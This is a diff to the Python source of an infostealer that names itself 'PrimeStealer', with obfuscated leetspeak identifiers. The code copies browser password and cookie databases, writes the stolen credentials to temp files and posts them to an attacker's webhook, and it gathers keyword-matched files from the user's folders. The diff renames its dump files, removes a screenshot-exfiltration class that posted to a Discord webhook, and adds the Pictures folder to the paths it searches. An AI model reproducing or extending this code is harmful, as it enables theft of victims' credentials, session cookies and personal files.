@@ -621,7 +621,6 @@ class PcInfo:
             }
     L04DUr118(hook, data=dumps(data).encode(), headers=headers)
 
-# MADE BY 0x77ff | Thank you.
 
 def edge_logger():
     try:
@@ -729,7 +728,7 @@ def UP104D(name, link):
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     }
 
-    if name == "lxcook":
+    if name == "pcook":
         rb = ' | '.join(da for da in c00K1W0rDs)
         if len(rb) > 1000: 
             rrrrr = R3F0rM47(str(c00K1W0rDs))
@@ -754,7 +753,7 @@ def UP104D(name, link):
         L04DUr118(hook, data=dumps(data).encode(), headers=headers)
         return
 
-    if name == "lxpassw":
+    if name == "ppassw":
         ra = ' | '.join(da for da in p45WW0rDs)
         if len(ra) > 1000: 
             rrr = R3F0rM47(str(p45WW0rDs))
@@ -809,7 +808,7 @@ def UP104D(name, link):
         return
 
 def wr173F0rF113(data, name):
-    path = os.getenv("TEMP") + f"\lx{name}.txt"
+    path = os.getenv("TEMP") + f"\p{name}.txt"
     with open(path, mode='w', encoding='utf-8') as f:
         f.write(f"<--PrimeStealer-->\n\n")
         for line in data:
@@ -842,7 +841,7 @@ def g37P455W(path, arg):
     pathC = path + arg + "/Login Data"
     if os.stat(pathC).st_size == 0: return
 
-    tempfold = temp + "lx" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
+    tempfold = temp + "p" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
 
     shutil.copy2(pathC, tempfold)
     conn = sql_connect(tempfold)
@@ -879,7 +878,7 @@ def g37C00K13(path, arg):
     pathC = path + arg + "/Cookies"
     if os.stat(pathC).st_size == 0: return
     
-    tempfold = temp + "lx" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
+    tempfold = temp + "p" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
     
     shutil.copy2(pathC, tempfold)
     conn = sql_connect(tempfold)
@@ -991,38 +990,6 @@ def G47H3rZ1P5(paths1, paths2, paths3):
         "attachments": []
     }
     L04DUr118(hook, data=dumps(data).encode(), headers=headers)
-
-class Screengrab:
-    def __init__(self):
-        self.get_inf(__CONFIG__["webhook"])
-
-    def get_inf(self, webhook):
-        image = ImageGrab.grab(
-            bbox=None,
-            all_screens=True,
-            include_layered_windows=False,
-            xdisplay=None
-        )
-        image.save(temp_path + "\\desktopshot.png")
-        image.close()
-        webhook_data = {
-            "username": "PrimeStealer",
-            "avatar_url": "https://media.discordapp.net/attachments/1216499065521700987/1216500554612867082/prime.png?ex=66009d6d&is=65ee286d&hm=a868ad4bd7cc30d12008971650d2bd4745e9a80158b183dd2e60c7e9035ca1cf&=&format=webp&quality=lossless&width=204&height=204",
-            "embeds": [
-                {
-                    "title": "Screenshot",
-                    "image": {
-                        "url": "attachment://image.png"
-                    }
-                }
-            ]
-        }
-
-        with open(temp_path + "\\desktopshot.png", "rb") as f:
-            image_data = f.read()
-            encoder = MultipartEncoder({'payload_json': json.dumps(webhook_data), 'file': ('image.png', image_data, 'image/png')})
-
-        requests.post(hook, headers={'Content-type': encoder.content_type}, data=encoder)
 
 def Z1P73136r4M(path, arg, procc):
     global O7H3rZ1p
@@ -1199,7 +1166,7 @@ def G47H3r411():
     global uP7Hs
     uP7Hs = []
 
-    for file in ["lxpassw.txt", "lxcook.txt"]: 
+    for file in ["ppassw.txt", "pcook.txt"]: 
         # upload(os.getenv("TEMP") + "\\" + file)
         UP104D(file.replace(".txt", ""), uP104D7060F113(os.getenv("TEMP") + "\\" + file))
 
@@ -1247,7 +1214,8 @@ def K1W1():
     path2search = [
         user + "/Desktop",
         user + "/Downloads",
-        user + "/Documents"
+        user + "/Documents",
+        user + "/Pictures",
     ]
 
     key_wordsFolder = [
